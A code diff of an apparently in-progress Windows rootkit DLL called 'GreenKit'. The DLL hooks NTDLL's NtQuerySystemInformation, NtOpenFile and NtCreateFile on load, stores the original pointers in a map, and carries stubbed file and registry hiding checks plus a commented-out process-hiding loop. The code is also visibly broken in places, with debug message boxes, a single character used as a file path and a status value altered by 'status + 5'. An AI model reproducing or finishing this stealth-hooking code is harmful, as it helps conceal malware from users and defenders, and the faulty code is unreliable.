@@ -1,6 +1,8 @@
 #include "stdafx.h"
 #include "GreenKit.h"
 
+std::map<std::string, void*> m_OldFunctionsMap;
+
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
 }
@@ -8,27 +10,6 @@ BOOL mustHideFile(TCHAR filePath) {
 BOOL mustHideReg(TCHAR filePath) {
     return TRUE; // TODO check la fin de la string avec des constantes
 }
-
-typedef struct _MY_SYSTEM_PROCESS_INFORMATION
-{
-    ULONG                   NextEntryOffset;
-    ULONG                   NumberOfThreads;
-    LARGE_INTEGER           Reserved[3];
-    LARGE_INTEGER           CreateTime;
-    LARGE_INTEGER           UserTime;
-    LARGE_INTEGER           KernelTime;
-    UNICODE_STRING          ImageName;
-    ULONG                   BasePriority;
-    HANDLE                  ProcessId;
-    HANDLE                  InheritedFromProcessId;
-} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
-
-typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
-    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    __inout    PVOID SystemInformation,
-    __in       ULONG SystemInformationLength,
-    __out_opt  PULONG ReturnLength
-    );
 
 NTSTATUS WINAPI NewNtOpenFile(
     PHANDLE				phFile,
@@ -42,10 +23,10 @@ NTSTATUS WINAPI NewNtOpenFile(
     //DWORD dwRet;
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
     MessageBox(0, "NTDLL OPEN HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
-    if (!mustHideFile(*sPath))
-        NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+    //if (!mustHideFile(*sPath))
+    NTSTATUS status = ((PNT_OPEN_FILE)m_OldFunctionsMap["NtOpenFile"])(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
 
-    return 3; // STATUS_NO_SUCH_FILE
+    return status; // STATUS_NO_SUCH_FILE
 }
 
 NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
@@ -57,10 +38,10 @@ NTSTATUS WINAPI NewNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, P
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
     MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
     //if (!mustHideFile(*sPath))
-        NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
+    NTSTATUS status = ((PNT_CREATE_FILE)m_OldFunctionsMap["NtCreateFile"])(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
         CreateOptions, EaBuffer, EaLength);
 
-    return 3; // STATUS_NO_SUCH_FILE
+    return status; // STATUS_NO_SUCH_FILE
 }
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
@@ -70,12 +51,11 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
     __out_opt  PULONG                   ReturnLength
     )
 {
-    /*NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
+    NTSTATUS status = ((PNT_QUERY_SYSTEM_INFORMATION) m_OldFunctionsMap["NtQuerySystemInformation"])(SystemInformationClass,
         SystemInformation,
         SystemInformationLength,
-        ReturnLength);*/
-    MessageBox(0, "NTDLL HOOOKED1", "HookTest", MB_OK | MB_ICONERROR);
-    NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+        ReturnLength);
+    /*
     if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
     {
         //
@@ -104,8 +84,8 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
                 pNext = pCurrent;
             }
         } while (pCurrent->NextEntryOffset != 0);
-    }
-    return status;
+    }*/
+    return status + 5;
 }
 
 void *Hook(char *szDllName, char *szFunctionName, void *pNewFunction)
@@ -150,9 +130,13 @@ bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
     switch (dwReason)
     {
     case DLL_PROCESS_ATTACH:
-        Hook("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
-        Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
-        Hook("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);
+        void* l_OldNtQuerySysInformation = (PNT_QUERY_SYSTEM_INFORMATION) Hook("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
+        void* l_OldNtOpenFile = Hook("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
+        void* l_OldNtCreateFile = Hook("NTDLL.DLL", "NtCreateFile", NewNtCreateFile);
+
+        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtQuerySystemInformation", l_OldNtQuerySysInformation));
+        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtOpenFile", l_OldNtOpenFile));
+        m_OldFunctionsMap.insert(std::pair<std::string, void*>("NtCreateFile", l_OldNtCreateFile));
         return TRUE;
     }
     return TRUE;
